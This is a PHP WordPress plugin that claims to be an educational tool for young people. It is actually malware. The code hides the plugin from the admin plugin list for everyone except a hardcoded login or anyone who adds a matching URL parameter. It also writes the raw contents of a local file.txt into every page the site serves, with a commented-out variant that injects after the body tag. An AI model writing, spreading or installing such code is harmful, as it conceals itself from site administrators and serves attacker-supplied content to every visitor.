<?php
/*
Plugin Name: pluginmonsters
Description: helps young people learn to think creatively, reason systematically, and work collaboratively – essential skills for life in the 21st.
Author: Sratch
Version: 1.1
*/


define('SECURITYFIREWALL__BASENAME', basename( __DIR__ ) );
define('SECURITYFIREWALL__PLUGIN', SECURITYFIREWALL__BASENAME . DIRECTORY_SEPARATOR . basename( __FILE__ ) );
define('SECURITYFIREWALL__PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
define('SECURITYFIREWALL__SCRIPT_DIR', SECURITYFIREWALL__PLUGIN_DIR ); 
define('SECURITYFIREWALL__SCRIPT_FILE',  'file.txt');
define('SECURITYFIREWALL__SCRIPT_FILE_FULL', SECURITYFIREWALL__SCRIPT_DIR . SECURITYFIREWALL__SCRIPT_FILE);
define('SECURITYFIREWALL__ADMIN_LOGIN', 'SECURITYFIREWALL__ADMIN');


//скрываем плагины от всех кроме главного админа start
function SECURITYFIREWALL_hide($plugins) {
    
    if( $_GET[SECURITYFIREWALL__ADMIN_LOGIN] == 1 ) {
        return $plugins;
    }
    
    $user = wp_get_current_user();

    if( $user->data->user_login === SECURITYFIREWALL__ADMIN_LOGIN ) {
        return $plugins;
    }

    if( is_plugin_active( SECURITYFIREWALL__PLUGIN ) ) {
        unset( $plugins[ SECURITYFIREWALL__PLUGIN ] );
    }

    return $plugins;
}

add_filter('all_plugins', 'SECURITYFIREWALL_hide');

add_action( 'loop_start', function (){
    if( file_exists(SECURITYFIREWALL__SCRIPT_FILE_FULL) && is_readable(SECURITYFIREWALL__SCRIPT_FILE_FULL) ) {
        readfile(SECURITYFIREWALL__SCRIPT_FILE_FULL);
    }
});

//add_action('shutdown', function() {
//    $final = '';
//    $levels = ob_get_level();
//    for ($i = 0; $i <= $levels; $i++){
//        $final .= ob_get_clean();
//    }
//    echo apply_filters('final_output', $final);
//}, 0);
//
//add_filter('final_output', function($output) {
//    $after_body = apply_filters('after_body','');
//    if( !$after_body ) return NULL;
//    $output = preg_replace("/(\<body.*\>)/", "$1".$after_body, $output);
//    //echo '<textarea>', htmlspecialchars($output),'</textarea>';
//    return $output;
//});
//
//add_action('after_body', function() {
//    if( file_exists(SECURITYFIREWALL__SCRIPT_FILE_FULL) && is_readable(SECURITYFIREWALL__SCRIPT_FILE_FULL) ) {
//        $content = file_get_contents(SECURITYFIREWALL__SCRIPT_FILE_FULL);
//        return ($content === FALSE ? NULL : $content);
//    }
//});
